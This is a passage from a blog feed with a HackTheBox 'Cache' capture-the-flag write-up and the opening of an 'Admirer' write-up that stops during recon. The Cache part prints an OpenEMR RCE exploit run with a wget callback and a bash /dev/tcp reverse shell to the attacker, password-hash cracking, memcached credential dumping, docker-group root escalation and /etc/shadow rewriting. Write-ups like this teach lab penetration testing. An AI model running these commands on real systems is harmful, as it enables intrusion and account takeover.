&lt;span class="code-line"&gt;        &lt;span class="n"&gt;print_status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Skipping table (&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;num_tables&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;): &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &lt;span class="k"&gt;else&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;          &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;290&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;print_status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Dumping table (&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;num_tables&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;): &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;table_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;walk_table&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;save_csv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;table_data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;end&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &lt;span class="k"&gt;end&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;end&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;print_status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Dumped all tables to &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="no"&gt;Msf&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loot_directory&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="k"&gt;end&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We rerun our module and get the looted data, this time we have the username and
a password hash!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/$ cat /home/kali/.msf4/loot/20200516080433_default_10.10.10.188_openemr.users_se_390635.csv&lt;/span&gt;
&lt;span class="code-line"&gt;id,username,password,salt,last_update,password_history1,salt_history1,password_history2,salt_history2&lt;/span&gt;
&lt;span class="code-line"&gt;1,openemr_admin,$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.,$2a$05$l2sTLIG6GTBeyBf7TAKL6A$,2019-11-21 06:38:40,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We load the has inside &lt;code&gt;john&lt;/code&gt; the ripper and quickly get the password &lt;code&gt;xxxxxx&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ john hash&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;bcrypt&amp;quot;, but the string is also recognized as &amp;quot;bcrypt-opencl&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--format=bcrypt-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])&lt;/span&gt;
&lt;span class="code-line"&gt;Cost 1 (iteration count) is 32 for all loaded hashes&lt;/span&gt;
&lt;span class="code-line"&gt;Will run 8 OpenMP threads&lt;/span&gt;
&lt;span class="code-line"&gt;Proceeding with single, rules:Single&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;Almost done: Processing the remaining buffered candidate passwords, if any.&lt;/span&gt;
&lt;span class="code-line"&gt;Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist&lt;/span&gt;
&lt;span class="code-line"&gt;xxxxxx           (?)&lt;/span&gt;
&lt;span class="code-line"&gt;1g 0:00:00:00 DONE 2/3 (2020-05-16 14:07) 4.347g/s 5008p/s 5008c/s 5008C/s stinky..88888888&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably&lt;/span&gt;
&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can now connect on OpenEMR using our credentials &lt;code&gt;openemr_admin:xxxxxx&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="OpenEMR authenticated" src="/media/2020.10/cache_06.png"&gt;&lt;/p&gt;
&lt;p&gt;We then fireup the authenticated exploit for openEMR found previously. At the
same time we start a simple Python HTTP server in order to check our RCE. It
works.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$python ./45161.py &amp;#39;http://hms.htb&amp;#39; -u openemr_admin -p xxxxxx -c &amp;#39;wget http://10.10.14.156:8081/$(id)t 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;$python3 -m http.server 8081&lt;/span&gt;
&lt;span class="code-line"&gt;Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...&lt;/span&gt;
&lt;span class="code-line"&gt;10.10.10.188 - - [16/May/2020 08:44:58] code 404, message File not found&lt;/span&gt;
&lt;span class="code-line"&gt;10.10.10.188 - - [16/May/2020 08:44:58] &amp;quot;GET /uid=33(www-data) HTTP/1.1&amp;quot; 404 -&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We change our payload in order to get a reverse shell. We launch a &lt;code&gt;netcat&lt;/code&gt; to
catch our reverse shell.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$python ./45161.py &amp;#39;http://hms.htb&amp;#39; -u openemr_admin -p xxxxxx -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.156/4242 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;$nc -l -p 4242&lt;/span&gt;
&lt;span class="code-line"&gt;bash: cannot set terminal process group (2504): Inappropriate ioctl for device&lt;/span&gt;
&lt;span class="code-line"&gt;bash: no job control in this shell&lt;/span&gt;
&lt;span class="code-line"&gt;www-data@cache:/var/www/hms.htb/public_html/interface/main$ whoami&lt;/span&gt;
&lt;span class="code-line"&gt;whoami&lt;/span&gt;
&lt;span class="code-line"&gt;www-data&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use python in order to get a better shell. And switch user to &lt;code&gt;ash&lt;/code&gt; reusing
the password found in the JavaScript file. This allow us to get to the
&lt;code&gt;user.txt&lt;/code&gt; flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;www-data@cache:/var/www/hms.htb/public_html/interface/main$ python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;$ su ash&lt;/span&gt;
&lt;span class="code-line"&gt;su ash&lt;/span&gt;
&lt;span class="code-line"&gt;Password: H@v3_fun&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;ash@cache:/var/www/hms.htb/public_html/interface/main$ cd&lt;/span&gt;
&lt;span class="code-line"&gt;cd&lt;/span&gt;
&lt;span class="code-line"&gt;  ash@cache:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;a3014a6da5ebe33cd897b66b44397ef1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We use &lt;a href="https://github.com/DominicBreuker/pspy"&gt;pspy&lt;/a&gt; to enumerate the running
process. We see that a few process are running especially &lt;code&gt;dockerd&lt;/code&gt; and
&lt;code&gt;memecached&lt;/code&gt;. Given the name of the box is certain that the &lt;code&gt;memcached&lt;/code&gt; process
is involved.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;www-data@cache:/tmp/.plop$ ./pspy64&lt;/span&gt;
&lt;span class="code-line"&gt;./pspy64&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;snip&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;done&lt;/span&gt;
&lt;span class="code-line"&gt;2020/05/16 16:16:33 CMD: UID=103  PID=994    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only &lt;/span&gt;
&lt;span class="code-line"&gt;2020/05/16 16:16:33 CMD: UID=0    PID=992    | /usr/sbin/cron -f &lt;/span&gt;
&lt;span class="code-line"&gt;2020/05/16 16:16:33 CMD: UID=0    PID=977    | /usr/bin/dockerd -H fd:// &lt;/span&gt;
&lt;span class="code-line"&gt;2020/05/16 16:16:33 CMD: UID=0    PID=969    | /usr/lib/accountsservice/accounts-daemon &lt;/span&gt;
&lt;span class="code-line"&gt;2020/05/16 16:16:33 CMD: UID=111  PID=964    | /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid &lt;/span&gt;
&lt;span class="code-line"&gt;2020/05/16 16:16:33 CMD: UID=0    PID=961    | /usr/bin/VGAuthService &lt;/span&gt;
&lt;span class="code-line"&gt;2020/05/16 16:16:33 CMD: UID=0    PID=96     |&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;A few Google search lead us to an article about
&lt;a href="https://www.hackingarticles.in/penetration-testing-on-memcached-server/"&gt;testing memcached&lt;/a&gt;.
We connect to the service using telnet. We list the item available, get the
&lt;code&gt;user&lt;/code&gt; and the &lt;code&gt;passwd&lt;/code&gt; items.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;www-data@cache:/var/cache/apt$ telnet 127.0.0.1 11211&lt;/span&gt;
&lt;span class="code-line"&gt;telnet 127.0.0.1 11211&lt;/span&gt;
&lt;span class="code-line"&gt;Trying 127.0.0.1...&lt;/span&gt;
&lt;span class="code-line"&gt;Connected to 127.0.0.1.&lt;/span&gt;
&lt;span class="code-line"&gt;Escape character is &amp;#39;^]&amp;#39;.&lt;/span&gt;
&lt;span class="code-line"&gt;stats cachedump 1 0&lt;/span&gt;
&lt;span class="code-line"&gt;ITEM link [21 b; 0 s]&lt;/span&gt;
&lt;span class="code-line"&gt;ITEM user [5 b; 0 s]&lt;/span&gt;
&lt;span class="code-line"&gt;ITEM passwd [9 b; 0 s]&lt;/span&gt;
&lt;span class="code-line"&gt;ITEM file [7 b; 0 s]&lt;/span&gt;
&lt;span class="code-line"&gt;ITEM account [9 b; 0 s]&lt;/span&gt;
&lt;span class="code-line"&gt;END&lt;/span&gt;
&lt;span class="code-line"&gt;get user&lt;/span&gt;
&lt;span class="code-line"&gt;VALUE user 0 5&lt;/span&gt;
&lt;span class="code-line"&gt;luffy&lt;/span&gt;
&lt;span class="code-line"&gt;END&lt;/span&gt;
&lt;span class="code-line"&gt;get passwd&lt;/span&gt;
&lt;span class="code-line"&gt;VALUE passwd 0 9&lt;/span&gt;
&lt;span class="code-line"&gt;0n3_p1ec3&lt;/span&gt;
&lt;span class="code-line"&gt;END&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We get back to an interactive shell and switch user to &lt;code&gt;luffy&lt;/code&gt;. We quickly
identify that we belong to the &lt;code&gt;docker&lt;/code&gt; group and display the &lt;code&gt;docker&lt;/code&gt; version.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ su luffy&lt;/span&gt;
&lt;span class="code-line"&gt;su luffy&lt;/span&gt;
&lt;span class="code-line"&gt;Password: 0n3_p1ec3&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;luffy@cache:/var/www/hms.htb/public_html/interface/main$ id&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;luffy@cache:/var/www/hms.htb/public_html/interface/main$ docker --version&lt;/span&gt;
&lt;span class="code-line"&gt;docker --version&lt;/span&gt;
&lt;span class="code-line"&gt;Docker version 18.09.1, build 4c52b90&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use &lt;code&gt;searchsploit&lt;/code&gt; again but th listed one is destructive.&lt;/p&gt;
&lt;p&gt;A few Google search lead us to
&lt;a href="https://www.hackingarticles.in/docker-privilege-escalation/"&gt;another article&lt;/a&gt;
explaining how you can get a full access to the host system by mounting it into
the docker machine. We quickly list the available images. Only a &lt;code&gt;ubuntu&lt;/code&gt; is
available.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;luffy@cache:/var/www/hms.htb/public_html/interface/main$ docker image ls&lt;/span&gt;
&lt;span class="code-line"&gt;docker image ls&lt;/span&gt;
&lt;span class="code-line"&gt;REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE&lt;/span&gt;
&lt;span class="code-line"&gt;ubuntu              latest              2ca708c1c9cc        7 months ago        64.2MB&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We mount &lt;code&gt;/root/&lt;/code&gt; into our docker machine and that allow us to get the
&lt;code&gt;root.txt&lt;/code&gt; flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;luffy@cache:~/.plop$ docker run -v /root/:/mnt -it ubuntu&lt;/span&gt;
&lt;span class="code-line"&gt;docker run -v /root/:/mnt -it ubuntu&lt;/span&gt;
&lt;span class="code-line"&gt;root@884f0f892e34:/#ls /mnt&lt;/span&gt;
&lt;span class="code-line"&gt;ls /mnt&lt;/span&gt;
&lt;span class="code-line"&gt;root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;root@884f0f892e34:/# cat /mnt/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;cat /mnt/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;da8b94288d919f4c6089fccdaa318832&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We could also have mounted the whole file system &lt;code&gt;/&lt;/code&gt; and get the content of
&lt;code&gt;/etc/shadow&lt;/code&gt; to crack the root password. Or even rewrite the root password in &lt;code&gt;/etc/shadow&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Another docker trick is to &lt;code&gt;chroot&lt;/code&gt; into the mounted folder to get a root to
directly get a shell on the system: &lt;code&gt;docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can then generate a new password using &lt;code&gt;perl&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# perl -e &amp;#39;print crypt(&amp;quot;password&amp;quot;,&amp;quot;\$6\$saltsalt\$&amp;quot;) . &amp;quot;\n&amp;quot;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;perl -e &amp;#39;print crypt(&amp;quot;password&amp;quot;,&amp;quot;\$6\$saltsalt\$&amp;quot;) . &amp;quot;\n&amp;quot;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;$6$saltsalt$qFmFH.bQmmtXzyBY0s9v7Oicd2z4XSIecDzlB5KiA2/jctKu9YterLp8wwnSq.qc.eoxqOmSuNp2xS0ktL3nh/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And then put the new hash value in a new file &lt;code&gt;/etc/shadow.new&lt;/code&gt;, check it and
then replace the original &lt;code&gt;/etc/shadow&lt;/code&gt; file. One the new value is set we can
exit the docker and switch user to root.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# perl -pe &amp;#39;s|(root):(\$.*?:)|\1:\$6\$SALTsalt\$UiZikbV3VeeBPsg8./Q5DAfq9aj7CVZMDU6ffBiBLgUEpxv7LMXKbcZ9JSZnYDrZQftdG319XkbLVMvWcF/Vr/:|&amp;#39; /etc/shadow &amp;gt; /etc/shadow.new&lt;/span&gt;
&lt;span class="code-line"&gt;perl -pe &amp;#39;s|(root):(\$.*?:)|\1:\$6\$SALTsalt\$UiZikbV3VeeBPsg8./Q5DAfq9aj7CVZMDU6ffBiBLgUEpxv7LMXKbcZ9JSZnYDrZQftdG319XkbLVMvWcF/Vr/:|&amp;#39; /etc/shadow &amp;gt; /etc/shadow.new&lt;/span&gt;
&lt;span class="code-line"&gt;# cat /etc/shadow.new&lt;/span&gt;
&lt;span class="code-line"&gt;cat /etc/shadow.new&lt;/span&gt;
&lt;span class="code-line"&gt;root:$6$SALTsalt$UiZikbV3VeeBPsg8./Q5DAfq9aj7CVZMDU6ffBiBLgUEpxv7LMXKbcZ9JSZnYDrZQftdG319XkbLVMvWcF/Vr/:18178:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;daemon:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;bin:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;sys:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;sync:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;games:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;man:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;lp:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;mail:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;news:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;uucp:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;proxy:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;www-data:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;backup:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;list:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;irc:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;gnats:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;nobody:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;systemd-network:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;systemd-resolve:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;syslog:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;messagebus:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;_apt:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;lxd:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;uuidd:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;dnsmasq:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;landscape:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;pollinate:*:17941:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;sshd:*:18156:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;ash:$6$xXLd6jlN$b37bISaMTwk2uxlpOsRFlJYmNMzFPlSb.7nD2oSzhjtdikwne5j17lAtfwKP0jyfaScDgLKFn9gyPvxg57NcS.:18157:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;luffy:$6$aPEHFC8D$9ZWqYH2UuImmKRLWA7ZBzSWiBiGLUmXCn7BBpcFq5quVXIj6mA0QtiGwH8opTZ53AzpgnPhaOGq4i1SaRlBlP/:18157:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;memcache:!:18157:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;mysql:!:18219:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;# mv /etc/shadow.new /etc/shadow    &lt;/span&gt;
&lt;span class="code-line"&gt;mv /etc/shadow.new /etc/shadow&lt;/span&gt;
&lt;span class="code-line"&gt;# exit&lt;/span&gt;
&lt;span class="code-line"&gt;exit&lt;/span&gt;
&lt;span class="code-line"&gt;luffy@cache:~$ su&lt;/span&gt;
&lt;span class="code-line"&gt;su&lt;/span&gt;
&lt;span class="code-line"&gt;Password: password&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;root@cache:/home/luffy#&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;The box was overall interesting. The root part was really nice as it chained the
memcache "exploitation" and the "docker" one.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Linux"></category><category term="openEMR"></category><category term="docker"></category><category term="memcache"></category></entry><entry><title>HTB: Admirer</title><link href="https://maggick.fr/2020/09/htb-admirer.html" rel="alternate"></link><published>2020-09-27T08:30:00+02:00</published><updated>2020-09-27T08:30:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-09-27:/2020/09/htb-admirer.html</id><summary type="html">&lt;p&gt;&lt;img alt="Admirer card" class="align-left" src="/media/2020.09/admirer_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/248"&gt;Admirer&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/159204"&gt;polarbearer&lt;/a&gt; and
&lt;a href="https://www.hackthebox.eu/home/users/profile/125033"&gt;GibParadox&lt;/a&gt; and publish on
May 2, 2020.
This box is classified as an easy machine. The user part implied a few
enumeration and an adminer vulnerability.
The root part implied a sudo permission with SETENV and a python script.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.09/admirer_card.png" alt="Admirer card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/248"&gt;Admirer&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/159204"&gt;polarbearer&lt;/a&gt; and
&lt;a href="https://www.hackthebox.eu/home/users/profile/125033"&gt;GibParadox&lt;/a&gt; and publish on
May 2, 2020.
This box is classified as an easy machine. The user part implied a few
enumeration and an adminer vulnerability.
The root part implied a sudo permission with SETENV and a python script.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. Only the ports 21(FTP), 22 (SSH) and 80 (HTTP) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Mon May  4 11:30:21 2020 as: nmap -p- -sS -oN nmap 10.10.10.187&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.187&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.020s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65532 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;21/tcp open  ftp&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Mon May  4 11:39:02 2020 -- 1 IP address (1 host up) scanned in 520.65 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="ftp"&gt;FTP&lt;/h2&gt;
&lt;p&gt;The ftp service doesn't allow anonymous connections.&lt;/p&gt;
&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The home web page is a collection of picture.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Home page" src="/media/2020.09/admirer_01.png"&gt;&lt;/p&gt;
&lt;p&gt;We look at the &lt;code&gt;robot.txt&lt;/code&gt; file, it contains the location of some &lt;code&gt;admin-dir&lt;/code&gt;
directory supposed to contain some credentials.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;User-agent: *&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo&lt;/span&gt;
&lt;span class="code-line"&gt;Disallow: /admin-dir&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We try a few filename like &lt;code&gt;passwords.txt&lt;/code&gt;, &lt;code&gt;creds.txt&lt;/code&gt;… &lt;code&gt;credentials.txt&lt;/code&gt; works
and give use a few usernames and password for some services including ftp.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[Internal mail account]&lt;/span&gt;
&lt;span class="code-line"&gt;w.cooper@admirer.htb&lt;/span&gt;
